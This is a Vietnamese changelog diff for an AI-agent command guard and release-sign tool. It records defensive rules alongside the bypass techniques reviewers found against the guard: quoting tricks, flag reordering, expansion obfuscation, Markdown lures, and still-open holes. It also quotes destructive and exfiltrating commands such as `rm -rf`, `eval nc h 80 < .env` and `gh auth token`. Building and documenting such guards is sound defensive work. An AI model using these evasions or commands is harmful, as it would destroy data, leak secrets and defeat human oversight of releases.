@@ -6,7 +6,203 @@ Bản < 3.20.0: [`CHANGELOG-ARCHIVE.md`](CHANGELOG-ARCHIVE.md) (T-3651; `changel
 
 ## [Unreleased]
 
+### Added
+
+- **ADR-0075** (chủ dự án 2026-11-11, D-419) và [PLAN-factory-e2e](docs/autopilot/PLAN-factory-e2e.md) (D-420,
+  T-3841…T-3866): định hướng xưởng đầu-cuối — ý tưởng tới bản dev có receipt không hỏi người, song song khi `files:`
+  không giao, agent ký/duyệt ở mọi quy mô qua khoá chỉ người bật, việc người gom một checklist sau bản dev; kèm
+  [nghiên cứu khoảng hở dây chuyền](research/2026-11-11-factory-end-to-end.md). Chỉ tài liệu: không đổi mã, khoá, ID
+  hay mức; dự án đích chưa phải làm gì.
+- **ADR-0074** (chủ repo 2026-11-08 "cho agent ký GO-NO-GO", D-401): khoá `xt.yaml` `release_signoff: agent` và lệnh
+  `xt.py release-sign --note … [--file …]` — agent ký §5 GO-NO-GO chỉ khi `release-check` (blueprint/sổ audit ở đường
+  mặc định) không FAIL BLOCKER, việc người còn lại chỉ là chữ ký, `BLUEPRINT.md` khai `scale: S`, không còn `loop
+  defer`, và dòng `subject:` khớp ứng viên; dòng ký ghi ô tên `agent` (không ghi tên người), ghi xong đọc lại, không đủ
+  cho `promotion` thì hoàn tác; không ký khi `promotion` rejected, khi lịch sử git (bản clone `--mirror` mới của
+  `origin` hợp lịch sử cục bộ, mọi `GO-NO-GO*.md`) còn lời từ chối của người chưa bị dòng ký GO người trên origin, cùng
+  phiên bản hay cao hơn, thay — không hết hạn theo tuổi (D-404…D-406; offline/không đọc được/repo nông → không ký) hay
+  MUST không lệnh kiểm, và dòng `agent` khi khoá tắt là
+  `pending_human`. `release-check --json` thêm `promotion.by` (ô tên đã ký). Khoá có hiệu lực khi cả cây
+  lẫn bản đã commit ở nhánh chính khai, nằm trong `HARD_GATED_KEYS` (PR đổi khoá luôn người merge). Guard chỉ cho một
+  lệnh đơn chữ rõ (`--file`/`--note`) khi khoá có hiệu lực; mọi dạng khác của `release-sign` và mọi đường ghi dòng ký
+  khác vẫn `GO_SIGN`. Repo khung: khoá dạng chú thích, bật ở PR riêng (D-402); mẫu dự án đích để trống. **Dự án đích:**
+  chạy lại `install.py`; muốn agent ký thì đặt `release_signoff: agent` qua PR người merge. Không đổi ID/mức mục
+  checklist.
+- Guard (lý do chạm hàng rào: phản biện ADR-0074 tìm ra đường tự bật khoá chỉ người đổi, D-402): đổi nhánh mặc định
+  (`gh repo edit --default-branch`, `gh api -X PATCH repos/o/r -f default_branch=…`) bị chặn như huỷ — nó dời ruleset
+  `~DEFAULT_BRANCH` khỏi `main`; tool MCP `create_or_update_file`/`push_files`/`delete_file` lên `main`/`master` hay không
+  nêu nhánh bị chặn như push thẳng nhánh chính (`PUSH_MAIN`); script Python nạp `xt` kèm tên chứa `sign`/`release` bị
+  chặn như AUD-SEC-498.
+- Nghiên cứu [nâng tự động hoá tới mức máy làm được](research/2026-11-08-full-automation.md): kiểm kê 247 điểm chờ
+  người, định nghĩa "máy không thể", phân loại, lát triển khai.
+
+### Changed
+
+- `check-links.py` (AUD-PERF-027): `mask_code_spans`/`table_cells` nhảy tới ký tự đặc biệt bằng regex thay vì duyệt
+  từng ký tự — dòng `lint` của `gate-fast` bớt khoảng nửa thời gian kiểm link (đo 1 789 → 876 ms khi máy tải); kết quả
+  kiểm không đổi (so vi sai trên mọi file `.md` của repo và fuzz).
+- Guard (lý do chạm hàng rào: nợ review #480 AUD-SEC-551, D-407): mã mới `REMOTE_DELETE` (máy chặn) cho xoá nhánh/tag
+  remote khác nhánh hiện tại của phiên (`git push --delete|-d`, `:<ref>`, `--prune`, `gh api -X DELETE …/git/refs/…`,
+  graphql `deleteRef`) và `git filter-branch --all`/nhiều ref, `git filter-repo`; xoá nhánh của chính phiên và `git
+  fetch --prune` vẫn chạy.
+- Guard (lý do chạm hàng rào: nợ review #485 AUD-SEC-556/557): cụm cờ ngắn có chữ số đọc ra cờ chữ — `git push -4d`,
+  `-q4d`, `-d4` là xoá (`REMOTE_DELETE`), `git push -4f`/`-6f` và `git checkout -2f` là ghi đè/vứt thay đổi (chặn như
+  `-d`/`-f`); chữ số sau cờ ăn giá trị dính liền vẫn là giá trị (`checkout -bfix2`, `push -o4d`).
+- Guard (lý do chạm hàng rào: nợ review #485 AUD-SEC-558): `gh pr close … --delete-branch|-d` (mọi vị trí cờ, số hay URL
+  PR) bị chặn `REMOTE_DELETE` — guard không biết nhánh head của PR; `gh pr close N` không cờ xoá như cũ.
+- Guard (lý do chạm hàng rào: nợ review #486 AUD-SEC-566): cụm cờ của `gh pr close` đọc tới chữ ăn giá trị đầu tiên
+  (`c`, `R`) bất kể ký tự sau — `-dRo/r`, `-dc.` bị chặn `REMOTE_DELETE`; `-Ro/r-d`, `-c.d` vẫn là giá trị.
+- Guard (lý do chạm hàng rào: nợ review #486 AUD-SEC-567): viết tắt MỘT chữ của tuỳ chọn git nguy hiểm được mở như
+  viết tắt dài hơn — `git push --m`/`--b`, `git reset --h`, `git clean --f`, `git checkout --f` bị chặn như dạng đầy
+  đủ; `--` trần giữ nguyên.
+- Guard (lý do chạm hàng rào: nợ review #487 AUD-SEC-569): bộ đọc tuỳ chọn ghi ref nhận viết tắt MỘT chữ như git —
+  `git update-ref --s` (= `--stdin`) bị chặn `UNRESOLVED_TARGET`, `git replace --c` (= `--convert-graft-file`) bị chặn.
+- Guard (lý do chạm hàng rào: nợ review #487 AUD-SEC-570): lệnh con `gh pr close`/`gh pr merge` tìm như cobra — cờ đứng
+  trước lệnh con ăn token kế (`gh pr -c x close 12 -d`, `gh -c x pr close 12 -d`, `gh pr -t x merge 12`, `gh -b x pr
+  merge 12 --auto`) nên bị xét như cờ đứng sau (`REMOTE_DELETE`, subject, `--auto`, `--admin`).
+- Guard (lý do chạm hàng rào: nợ review #488 AUD-SEC-571, D-408): các luật huỷ/xoá ref/merge/đối ngoại của `gh`
+  (`_gh_rule`) đọc thêm dạng cobra chạy khi cờ ăn giá trị đứng trước lệnh con (`gh --method DELETE api repos/o/r`, `gh -X
+  DELETE api …/git/refs/heads/x`, `gh -X PUT api …/pulls/7/merge`, `gh repo --visibility public edit`, `gh release
+  --repo o/r delete v1`), cách đọc nào chặt hơn thắng. Đính chính (AUD-DOC-281): bản trước ghi "mọi luật `gh`" — các
+  luật khác chỉ đọc dạng cobra từ mục D-409 dưới đây.
+- Guard (lý do chạm hàng rào: nợ review #489 AUD-SEC-575/577/578/579, D-409): MỌI luật đọc lệnh `gh` đi qua một điểm
+  vào (`_gh_readings`: nguyên văn + dạng cobra chạy; token đầu theo cobra `stripFlags`, không cần bảng nhóm — bảng chỉ
+  quyết định dời tên thứ hai), cách đọc chặt hơn thắng. AUD-SEC-575: dấu review qua cờ ghi đứng trước `api` (`gh -F
+  body=@r.md api …/comments`, `gh --field …`, cả khi lồng `sh -c`/`$(…)`) bị chặn `REVIEW_FORGE`. AUD-SEC-577: alias/
+  extension/lệnh lạ sau cờ (`gh --help=false alias set …`, `gh --help=false extension install o/r`, `gh -R o/r x`) bị
+  chặn như dạng chuẩn. AUD-SEC-578: ghi công AI/tiêu đề PR đọc `gh pr --body … create`, `gh -R o/r pr create …`, `gh pr
+  --title … create` (cả thân heredoc). AUD-SEC-579: `gh --input .env -X POST api …` bị chặn gửi bí mật. Bảng đối
+  ngoại/huỷ cũng đọc hai cách khi `gh` chạy qua trình chạy gói (`npx gh --repo o/r release delete v1` → `DESTROY`). Lưới
+  khi guard lỗi (`MERGE_CMD_RE`) cũng nhận cờ trước `pr`/`api`; `gh api` đọc `-R/--repo` như cờ ăn giá trị (gh 2.89
+  `api` không nhận `-R`, đọc chặt). Lọc chữ thô (`GH_POST_RE`, `GH_PR_TEXT_RE`, `MERGE_CMD_RE`) quét tuyến tính — bản
+  cũ của `GH_POST_RE` siêu tuyến tính với `gh api` lặp lại. AUD-DOC-281: CHANGELOG và `harness-files.md` nêu đúng phạm vi. AUD-TEST-095: test `adjacent` của
+  `_drop_redirect_ops`, ca corpus `gh -XDELETE api …`/`gh -X=DELETE api …`.
+- Guard (lý do chạm hàng rào: review #490 AUD-SEC-581/582, D-409): `--version` (cờ bool của gốc gh) không ăn token kế
+  trước tên lệnh đầu — `gh --version zz` (alias/extension/lệnh lạ) bị chặn như `gh zz` (AUD-SEC-581). Điểm vào chung
+  `_gh_readings` đọc thêm dạng bash đưa cho gh: bỏ chuyển hướng, đích và fd liền trước (`{fd}`, một chữ số), cùng dạng
+  giữ chữ số đó (số PR) trừ khi nó rơi vào vị trí tên lệnh — `gh pr 2>/dev/null merge 5`, `gh api -X DELETE repos/o/r
+  >/dev/null`, `gh repo 2>&1 edit --visibility public`, `gh gist 2>/dev/null create .env`, `gh pr 2>&1 create --title
+  …` ra đúng mã như dạng trơn; `gh --version 2>&1`, `gh --help 2>&1 | head`, `gh -h 2>&1` không còn bị chặn oan
+  (AUD-SEC-582). Merge đã kiểm (`allow`) xếp trên "không luật" khi gộp cách đọc (còn qua kiểm lệnh trơn); `&` của
+  chuyển hướng không ngắt cửa sổ heredoc của `GH_PR_TEXT_RE`.
+- Guard (lý do chạm hàng rào: nợ review #488 AUD-SEC-573): tên nhánh nhiều chữ số đứng trước chuyển hướng ở `git push
+  --delete` (`--delete 1234 >/dev/null`) bị chặn `REMOTE_DELETE`; một chữ số vẫn đọc là fd (`--delete <nhánh> 2>&1`).
+- Guard (lý do chạm hàng rào: nợ review #488 AUD-SEC-574): đối số toàn chữ số trước chuyển hướng của lệnh xoá
+  (`cd ~ && shred 2026 >/dev/null`, `rsync --delete … 2026 >/dev/null`) bị xét như đích (`WIPE_OUTSIDE`).
+- Guard (nợ review #487 AUD-HAR-354): `=` không còn tách cụm cờ không chỉ chữ của `gh pr close` — token gh từ chối hay
+  bỏ qua (`-4=d`, `-test.=d`) tính là có `-d` (chặt hơn).
+- Guard (lý do chạm hàng rào: nợ review #489 AUD-SEC-580): `gh repo deploy-key|ssh-key|gpg-key|run|label|issue|gist|
+  codespace|project delete`, `gh cache delete --all|-a` và `gh auth logout` mang mã `DESTROY` (mặc định chặn, strict
+  hỏi) — cả cờ đứng trước lệnh con, nhóm lồng `repo deploy-key` đọc tới tên thứ ba; tên gọi khác `gh cs delete` bị lớp
+  tập con chặn trước (`BUDGET`). Chỉ xoá khoá deploy/SSH/GPG khớp REST tương ứng (`gh api -X DELETE …/keys/…` đã
+  `DESTROY`); REST xoá nhãn/run/gist/cache: xem mục AUD-SEC-583 bên dưới (`DESTROY`). `gh auth token`/`gh auth status
+  -t|--show-token` (in token ra transcript) bị chặn ở mọi chính sách.
+- Guard (lý do chạm hàng rào: review #491 AUD-SEC-587, có từ trước): tên lệnh gh (nhóm/lệnh con, cả nhóm lồng) hay tên
+  cờ (`--tên` trước `=`, `-` liền mở rộng) có `$`/backtick — `gh pr merge$Z 5`, `gh repo delete$Z o/r`, `gh auth
+  token$Z`, `gh api … --input$Z f`, `gh pr $CMD 5`, `gh pr merge 5 -$Z` — lách mọi luật gh so token chính xác; giờ hỏi
+  mã `BUDGET` ở điểm vào chung `_gh_rule` (mặc định chặn, strict hỏi; như ADR-0065 lớp A). Mở rộng ở giá trị/đối số vị
+  trí (`gh pr view "$PR"`, `--repo="$R"`, `gh api "repos/$R/pulls"`) không đổi.
+- Guard (lý do chạm hàng rào: nợ review #491 AUD-SEC-583): `gh api -X DELETE` tới đường REST của lệnh gh xoá đã
+  `DESTROY` — `…/issues/N`, `…/actions/runs/N[/logs]`, `…/labels/<tên>`, `…/releases/N`, `…/actions/caches[?key=…]`,
+  `gists/<id>`, `user/codespaces/<tên>`, `projects/N` — mang mã `DESTROY` ở mọi cách viết phương thức (`-XDELETE`,
+  `--method=delete`, cụm cờ ngắn `-iX DELETE`/`-iXDELETE` — AUD-SEC-599) và tiền tố đường (`/repos/…`, `{owner}/{repo}`, URL đầy đủ); ghi `user/codespaces/secrets/…` như
+  `gh secret`. Xoá một cache theo id, gỡ nhãn khỏi issue, bỏ sao gist vẫn là ghi thường.
+- Guard (lý do chạm hàng rào: nợ review #485 AUD-SEC-555): `gh api` ghi ref (`PATCH …/git/refs/<ref>`, POST
+  `…/git/refs`, tags, số ít `git/ref/`) với trường `force` khác `false` (`-F`/`-f`/`--field`/`--raw-field`, `@tệp`,
+  biến) hay thân `--input` bị chặn cùng lý do `git push --force` (`RULE_DENY`, mọi chính sách); PATCH fast-forward
+  (không `force`/`force=false`) giữ hỏi thường.
+- Guard (lý do chạm hàng rào: nợ review #491 AUD-SEC-590): ở lệnh gh có luật cờ (`pr merge|close`, `api`, `auth
+  status`, `cache delete`, `repo edit`) token mà bash tách/bung thành cờ — mở rộng không nháy
+  đứng đầu từ (`gh pr merge 5 $X`, `--match-head-commit $SHA`, `$(…)`), cụm cờ ngắn có mở rộng (`-d$Z`), glob không nháy
+  bung được ra `-…` (`gh pr close 5 -*`) — và glob ở tên lệnh (`gh pr merg?`, `gh pr [m]erge`) hỏi mã `BUDGET` (mặc
+  định chặn, strict hỏi — D-411). Luật deny phẳng thắng `BUDGET` ở mọi chính sách: `gh pr merge 5 --auto $X` vẫn
+  `AUTO_MERGE_ENABLE` ở strict (ADR-0036 §3 — trước đây `--auto --x$Z` thành câu hỏi). Trong nháy kép (`"$PR"`), sau
+  chữ nguyên văn (`-F n=$N`, `repos/$R`), lệnh không có luật cờ (`gh pr view $PR`), sau `--`: không đổi.
+- Guard (lý do chạm hàng rào: review #492 AUD-SEC-594…599): lớp AUD-SEC-590 xét từ theo lệnh đơn gọi gh — tên đã bỏ
+  nháy (`g\h`, `g''h`, `command g\h` — 595), mọi mảnh của `${X:- -X DELETE}` có khoảng trắng (594); mở rộng/glob
+  không nháy ở lệnh khác (`echo $PR; gh pr close "$PR"`, `ls *; gh pr close '*'`) không còn chặn oan. `--` là giá trị
+  của cờ ăn token kế (`gh pr close 5 -c -- $X`, `gh auth status -h -- --show-token$Z` — gh 2.89 `-c` ăn `--`) không
+  kết thúc cờ (596/597). Lỗi tập con chuẩn không bị câu hỏi `BUDGET` hạ thành hỏi ở strict (`gh pr close 5 ${a[@]}` —
+  598). `gh api` đọc cụm cờ ngắn như pflag (`-iX DELETE`, `-iXDELETE`, `-iF force=true` — 599): xoá REST `DESTROY`,
+  ghi ref `force` `RULE_DENY`.
+
 ### Fixed
+
+- Guard (lý do chạm hàng rào: AUD-SEC-621 🔴 — xoá/ghi đè ref remote lọt mọi luật push): plumbing đẩy `git send-pack`,
+  `git http-push` và remote helper `git remote-<x>`/`git-remote-*` bị chặn (`REMOTE_DELETE`) ở mọi dạng — alias,
+  `git-<tên>` chạy thẳng, tên khác hoa thường. Các lệnh này không qua luật `git push` và không chạy hook pre-push. Chỉ
+  in cách dùng (`-h` đứng một mình, `send-pack --help`) được qua.
+- Guard (lý do chạm hàng rào: AUD-SEC-615 🔴, AUD-TEST-100; D-417, D-418): luật `GO_SIGN` không còn bị lách bằng mồi
+  Markdown (chú thích HTML, khối rào, `\r` trần, BOM). **Dự án đích: agent sửa `GO-NO-GO*.md` bằng Write cả file** — mọi
+  Edit/MultiEdit/NotebookEdit lên file đó bị chặn; agent ký qua `xt.py release-sign` (ADR-0074). Write/MCP so dòng ký §5
+  theo hai cách đọc (văn bản thô ∪ đúng phần `release-check` thấy), chặn `\r` không kèm `\n`, BOM lệch đĩa, đĩa không
+  đọc được; đổi tiêu đề/`subject:` của file đã ký so trên cả hai cách đọc; dòng ký GO chỉ là một dòng ở cả `xt.py` lẫn guard
+  (lời từ chối NO-GO vẫn đọc rộng). Chạy lại `install.py`.
+- Guard (lý do chạm hàng rào: AUD-SEC-622 🟠 — xoá ref người khác lọt REMOTE_DELETE): graphql `updateRefs`/`updateRef`
+  (`afterOid` toàn 0 = xoá ref, `force` = ghi đè) bị chặn như `deleteRef`; đích không đọc chắc nên luôn chặn.
+- Gói `web-api-ts` (AUD-CODE-064 🟠): `pnpm build` không còn ném `ENOBUFS` khi cây đóng gói vượt 1 MiB — tar ghi
+  thẳng `dist/app.tar` thay vì qua stdout; cờ tar/gzip và digest không đổi; thêm `test/build.test.ts`. **Dự án đích
+  (đã cài gói web-api-ts):** `scripts/build.ts` thuộc dự án nên `install.py` không ghi đè — sửa tay: đổi `-cf -` thành
+  `-cf dist/app.tar` và bỏ `writeFileSync("dist/app.tar", tar)`.
+- `xt.py` (AUD-HAR-377 🟠, ADR-0074): `release-sign` từ chối và hàng `verify` của `release-check` FAIL khi vòng đang bị
+  chặn — cờ (`loop block`/`ci-triage`), lỗi lặp ≥ `max_same_failure`, task đỏ ≥ `max_task_runs`, hoặc vòng kết thúc
+  `blocked` chưa `loop unblock`/`loop init`; lý do in theo từng nguồn. Trước đây vòng chờ người quyết mà agent vẫn ký
+  GO được vì chỉ `loop defer` được đọc. **Dự án đích:** chạy lại `install.py`; không phải đổi cấu hình.
+- `install.py` (AUD-SEC-616 🔴): `--pack` không còn ghi xuyên symlink `<file>.xtemplates-new` ra ngoài dự án ở nhánh
+  brownfield/đề xuất còn đó — action `skipped-symlink` ở `--plan` lẫn cài thật, kể cả liên kết treo; bước chuyển bản
+  ≤ 2.x gỡ liên kết `.xtemplates/harness.sha256.json` trước khi chép manifest cũ (trước đây liên kết treo làm `copy2`
+  tạo file ngoài dự án). **Dự án đích:** không phải làm gì.
+- Guard (lý do chạm hàng rào: AUD-SEC-605 🔴, D-414 — lệnh nguy hiểm lọt hẳn): từ chỉ gồm ký tự dấu mà có nháy/thoát
+  (`';'`, `"|"`, `\;`, `$';'`, `'&&'`, `'\n'`) là đối số nguyên văn như bash, không còn bị coi là toán tử — trước đây
+  `tokenize` bỏ nháy rồi mọi bộ tách lệnh cắt ở đó nên phần sau không luật nào xét (`git push origin x ';' --force`,
+  `git commit -m ';' --no-verify`, `rm -rf x '&&' /`, `gh pr close 5 -c ';' -d` từng cho qua). Sửa gốc: `tokenize`
+  trả token đó dạng `LitWord` (không bằng chuỗi toán tử, `_is_punct` sai, `shlex.join` nháy lại nên lệnh lồng
+  `sh -c`/`timeout`/`env`/`find -exec` vẫn thấy chữ; `eval` nối đối số rồi đọc lại như bash); `_dequote` giữ dấu đó cho
+  token còn nháy; find `-exec … \;` so dấu kết bằng chữ; lệnh trong container/`find -exec` ghép lại bằng `_join_tokens`
+  (chuyển hướng trần vẫn là chuyển hướng như trước, chỉ `LitWord` được nháy). Chữ đọc lại quét THÊM bản bỏ chuyển
+  hướng cùng đích (bản có chuyển hướng vẫn quét như trước — `eval nc h 80 < .env`): `eval`/`builtin eval`/`command
+  eval` (`eval git reset > ';' --hard` chạy `git reset --hard`), echo/printf nối ống sang shell (`echo git reset 2> ';'
+  --hard | sh`); printf có `%` quét thêm các đối số nối liền (`printf '%s ' rm -rf / | bash`); `watch` nối đối số rồi
+  `sh -c` nên `';'` là toán tử ở tầng đó. Lệnh có `LitWord` (ở bất kỳ tầng nào) được đọc thêm một lần kiểu cũ — dấu là
+  toán tử — và lấy quyết định chặt hơn (D-415, review #495 lượt 2): cách đọc mới chỉ thêm chặn, không cho qua lệnh
+  nào bản cũ chặn (`eval echo ';' bash <(nc …)`, `git 2> ';' rm -rq docs`, `watch -n 1 gh api -X DELETE … ';'`,
+  `typeset -x ';' HOME=.claude; …` từng lọt vì lỗ guard có từ trước lộ ra khi dấu thôi cắt lệnh); vì thế không chặn
+  oan bớt — `echo ';' git push --force` vẫn bị chặn như trước. **Chưa đóng** (D-415, giữ đúng hành vi cũ): thay tiến
+  trình/thay lệnh GIỮA đối số (`gh pr close 5 <(echo) -d`, `git push origin x < <(echo) --force`, `rm -rf x $(echo) /`,
+  từ dính `$(…)/sub`, `X=<(echo)y`), nháy lồng trong `"$(…)"` (tách thô) và các lỗ có từ trước mà lượt review này lộ ra
+  (dấu tách dính chuyển hướng `ls;>/dev/null rm -rf /`, chuyển hướng giữa `git` và lệnh con, tên thừa của
+  `export`/`typeset`, `cd` thừa đối số dưới dash, toán hạng cố định của `xargs`); bản mở rộng
+  cho lớp thay tiến trình gây hồi quy nên đã gỡ, làm lại riêng. Không đổi ID/mức mục checklist.
+- `release-check` (nợ review #474 AUD-HAR-334): hàng `tree` gọi `git status --porcelain --untracked-files=all
+  --ignore-submodules=none` — `status.showUntrackedFiles no` không còn giấu tệp chưa track (vân tay `subject.content`
+  gồm tệp đó mà hàng `tree` từng PASS "cây sạch"), `submodule.<tên>.ignore`/`diff.ignoreSubmodules all` không còn giấu
+  submodule bẩn.
+- `release-sign` (nợ review #480 AUD-HAR-340): điều kiện "không còn `loop defer`" đọc `.autopilot/state.json` của dự
+  án ở **mọi** worktree của repo (`git worktree list`, cùng thư mục con) thay vì chỉ thư mục đang chạy — ký từ worktree
+  khác không thoát việc chờ người của cây chính và ngược lại. Fail-closed: `.autopilot/` không theo git (`.gitignore`),
+  nên khi không worktree nào có `state.json` (clone riêng, chưa `loop init`), sổ không đọc được/không phải object/
+  `deferred` không phải object, hay không liệt kê được worktree → từ chối, exit 2. Vòng `/complete` luôn `loop init`
+  trước nên đường chuẩn không đổi.
+
+- Guard (nợ review #489 AUD-HAR-361): `gh release list|view|download|verify` không còn hỏi ở chế độ strict — chỉ lệnh
+  con ghi của release (`create`/`new`, `upload`, `edit`, `delete-asset`) hỏi; `delete` giữ `DESTROY`.
+- Guard (review #491, D-410): rút bản gỡ chặn oan AUD-HAR-364 khỏi #491 — nó nới lọc dấu review: lệnh con dính mở rộng
+  (`gh pr comment$Z 5 -F r.md`, AUD-SEC-585), lệnh trong tham số `sh -c`/`bash -c` và giá trị `GIT_EDITOR=…`/`env
+  GIT_EDITOR=…` (AUD-SEC-586) lọt `REVIEW_FORGE`. Lọc dấu review giữ đúng hành vi trước #491; chặn oan AUD-HAR-364
+  (chữ `gh pr … review` trong message `git commit -m`, giá trị `gh pr list --search "review:…"`) còn mở.
+- `_gh_short_has` với tập chữ ăn giá trị rỗng không còn dựng lớp ký tự `[]` (`re.error`).
+- Test đối chiếu cờ trước lệnh con gh dùng `assertLessEqual` thay `assertTrue(a <= b)` (CodeQL "Imprecise assert").
+- Guard (nợ review #487 AUD-HAR-353): dạng trợ giúp thật không còn bị chặn oan — `gh pr close 12 -d --help`/`-dh`,
+  `git replace -h 2>&1` (`2` của chuyển hướng không còn đọc là đối tượng), `git push -h` ở `main`; `-h`/`--help` là giá
+  trị của cờ khác (`gh pr merge 12 -b --help --auto`, `git push -o -h`) hay sau `--` vẫn bị xét như lệnh thật; chữ số
+  đứng trước chuyển hướng vẫn có thể là đối số (`git replace -f origin/main 1234 >/dev/null` vẫn bị chặn).
+- `release-sign` đọc khoá `release_signoff` ở nhánh mặc định của bản mirror `origin` vừa clone (cùng lần quét lời từ
+  chối) — khoá đã tắt trên remote mà `origin/main` cục bộ chưa fetch không còn cho agent ký (AUD-SEC-552, D-407).
+- Clone mirror của `release-sign` giữ riêng credential helper global của người dùng (`credential.helper`,
+  `credential.<url>.helper`) — remote HTTPS riêng tư không còn luôn bị từ chối; cấu hình khác vẫn cô lập (AUD-SEC-553).
+- Credential helper của clone mirror `release-sign` chỉ đọc từ cấu hình global thật của người dùng (bỏ `GIT_*`,
+  `XDG_CONFIG_HOME` agent export được), không còn giữ `GIT_ASKPASS`, bỏ khoá `credential.<url>.helper` có `=` git không
+  parse được (AUD-SEC-559, AUD-HAR-350).
+- Test `release-sign` dùng `assertNotIn` thay `assertFalse(a in b)` (CodeQL "Imprecise assert", AUD-TEST-094).
 
 - `release-check` chặn phát hành và để trống vân tay Git trong JSON khi lỗi đọc Git, HEAD đổi trong lúc kiểm, hoặc index
   có `assume-unchanged`/`skip-worktree` che tệp tracked. Dùng checkout đầy đủ, sạch cho cổng phát hành.
